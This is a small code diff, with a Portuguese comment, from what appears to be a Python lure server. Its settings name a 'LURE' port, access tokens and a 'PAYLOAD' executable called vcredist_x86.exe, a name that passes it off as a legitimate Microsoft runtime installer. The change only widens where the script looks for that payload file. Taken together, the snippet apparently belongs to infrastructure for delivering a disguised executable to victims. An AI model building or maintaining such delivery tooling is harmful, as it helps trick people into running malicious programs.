@@ -19,7 +19,11 @@ TOKEN = os.environ.get("RAF_TOKEN", "raf2026")
 KEY = os.environ.get("RAF_KEY", "raf-7c1f4b2e9a3d5f8b6c0e2a4d")
 PORT = int(os.environ.get("PORT", "8080"))
 LURE = int(os.environ.get("RAF_LURE_PORT", "8888"))
-PAYLOAD = os.path.join(HERE, "payload", "vcredist_x86.exe")
+
+# aceita o exe em payload/ (pasta) ou na raiz do projeto (upload solto)
+_CAND = [os.path.join(HERE, "payload", "vcredist_x86.exe"),
+         os.path.join(HERE, "vcredist_x86.exe")]
+PAYLOAD = next((p for p in _CAND if os.path.isfile(p)), _CAND[0])
 
 try:
     with open(os.path.join(HERE, "link_secret.txt"), encoding="utf-8") as f:
